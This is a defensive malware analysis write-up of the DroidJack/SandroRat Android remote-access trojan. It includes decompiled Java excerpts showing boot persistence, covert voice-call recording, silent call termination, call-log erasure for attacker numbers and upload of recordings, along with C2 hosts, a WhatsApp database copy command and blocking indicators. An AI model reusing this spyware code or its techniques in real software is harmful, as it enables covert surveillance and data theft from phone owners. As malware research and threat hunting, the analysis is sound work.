# Source-Level Analysis — DroidJack / SandroRat (Android RAT)

Companion to `MALWARE_ANALYSIS.md`. This document presents **decompiled source**
(text, not executable) recovered for autonomous analysis. No sample was executed.

- **Tool:** jadx 1.5.0 (DEX → Java)
- **APK SHA-256:** `30aa2eeeb8401e4a312a7e99462432769a7c569114180aaedbfcbef18b6db268`
- **classes.dex SHA-256:** `fcac2275c833038982ed5bf3f27715bb1991f679d398a125661df15821737a1e`
- **Recovered:** 90+ classes in `net.droidjack.server`, ~5,400 lines of Java.
  Class/field names are single-letter (compiler-obfuscated); the named classes
  below carry the behavior and decompile cleanly.

> The full decompiled tree is kept out of git (it is effectively recompilable RAT
> source). The annotated excerpts here are the analysis artifact — enough to
> understand every capability without redistributing a working build.

## Architecture overview
| Class | Role |
|---|---|
| `MainActivity` | First-run UI / bootstrap; starts the `Controller` service |
| `Controller` (Service) | **C2 brain.** KryoNet TCP client, command loop, dispatch |
| `Connector` (Receiver) | Persistence: re-launches `Controller` on BOOT_COMPLETED + network change |
| `CallListener` (Receiver) | Call monitoring, covert call recording, call-log tampering |
| `GPSLocation` (Service) | Location tracking |
| `CamSnapDJ` / `VideoCapDJ` | Hidden (translucent) silent photo / video capture activities |
| `g`, `e`, `by`, `ae`, …  | Helpers: upload, prefs store (`by`), crash log (`ae`), recorders |

## C2 channel (from `Controller`)
```java
import com.esotericsoftware.kryonet.Client;   // KryoNet networking library
...
protected static int z = 1337;                // default C2 TCP port
protected static String y = "";               // last command buffer
...
if (y.equals("DJ_GooDbYe:(")) { ... }          // server-issued disconnect/kill command
```
- **Transport:** KryoNet (TCP) client; default **port 1337**.
- **Report endpoint (dex strings):** `www.droidjack.net/Access/DJ`,
  `www.droidjack.net/storeReport.php`.
- `onStartCommand` reads `Build.SERIAL` (device id `t`) as the bot identifier and
  starts the connect thread; a 20 s `Timer` (`j()`) keeps the session alive.

## Persistence — `Connector.java` (verbatim)
```java
public class Connector extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        f240a = context;
        ae.a();
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            context.startService(new Intent(context, (Class<?>) Controller.class));
        }
        if (a() && !Controller.x) {                 // a() = network connected?
            context.startService(new Intent(context, (Class<?>) Controller.class));
        } else {
            Controller.b();                          // tear down when offline
        }
    }
}
```
**Analysis:** survives reboot and silently reconnects whenever connectivity
returns — the receiver is registered for both `BOOT_COMPLETED` and
`CONNECTIVITY_CHANGE` in the manifest.

## Covert call recording & anti-forensics — `CallListener.java` (key excerpts)
```java
public void a(File file) {                 // start recording
    c = new MediaRecorder();
    c.setAudioSource(4);                   // MediaRecorder.AudioSource.VOICE_CALL
    c.setOutputFormat(0);
    c.setAudioEncoder(0);
    c.setOutputFile(file.getAbsolutePath());
    c.prepare();
    c.start();
    f236a = true;                          // "Recording" flag
}

public boolean a() {                       // silently END a call via reflection
    ... getDeclaredMethod("getITelephony" / "getITelephonyMSim") ...
    for (Method m : ...getDeclaredMethods())
        if (m.getName().equalsIgnoreCase("endCall")) m.invoke(invoke, 1);
}

public void b() {                          // DELETE call-log rows for control numbers
    Cursor q = getContentResolver().query(CallLog.Calls.CONTENT_URI, ... "_id DESC");
    String number = q.getString(q.getColumnIndex("number"));
    if (number.contains(this.l) || number.contains(this.m))    // l/m = attacker numbers
        getContentResolver().delete(CallLog.Calls.CONTENT_URI, "_id = " + id, null);
}

public void c() {                          // stop + exfiltrate the recording
    c.stop(); c.release();
    if (this.k.exists()) new g(this.d).a(this.e, this.f, this.g, this.h);  // upload
}
```
**Analysis:**
- Records the **voice-call audio stream** (`AudioSource.VOICE_CALL`), not just mic.
- Two secret control numbers are stored in prefs via helper `by`
  (`"mobiledataphno"` default `000000000000000`, `"wifiphno"` default
  `111111111111111`); an incoming call from those triggers covert actions and
  toggles mobile data / Wi-Fi on via reflection (`setMobileDataEnabled`).
- Calls from control numbers are **auto-ended and erased from the call log**
  (`b()`), hiding the operator's interaction from the victim.
- Recordings are uploaded by helper class `g`.

## Other confirmed capabilities (dex / classes)
- **WhatsApp theft:** `cp data/data/com.whatsapp/databases/msgstore.db ...`,
  `/WhatsApp/Databases/wams.db`.
- **SMS** read/intercept/send (`SmsManager`), **contacts** & **call-log** theft
  into local SQLite tables `SandroRat_Contacts_Database`, `CallLogsTable`,
  `RecordedCallLogsTable`, `PhoneContactsTable`.
- **Silent camera/video** (`CamSnapDJ`, `VideoCapDJ` — translucent, no-title UI).
- **GPS** via `GPSLocation` service.

## Blackshades NET (`client.exe`) — note on source recovery
This sample is **Visual Basic 6** (native/P-code, `msvbvm60.dll`). jadx does not
apply. True source-level recovery requires a VB6-specific decompiler
(e.g. "VB Decompiler") in an isolated Windows environment; `radare2`/IDA give
x86 disassembly only. The behavior is already fully mapped via its ~70 embedded
VB form names and strings (keylogger, webcam/mic/screen capture, remote shell,
USB/IM spreading, click-fraud, DDoS, botkiller, crypter) — see
`MALWARE_ANALYSIS.md`. C2: `bshades.eu`, `*.no-ip.*` dynamic DNS.

## Manual-analysis pointers
- Start at `Controller.onStartCommand` → connect thread (`u`) → command loop;
  map each server command to its handler class (`bt`, `f`, `g`, `z`, `x` …).
- `by` is the key/value prefs store — search it to enumerate all config keys.
- `ae` is the crash/log helper — wraps every sensitive op in try/catch, useful
  for spotting capability boundaries.
- C2 indicators to block/hunt: `droidjack.net`, TCP/1337 KryoNet, token
  `DJ_GooDbYe:(`, device id = `Build.SERIAL`.
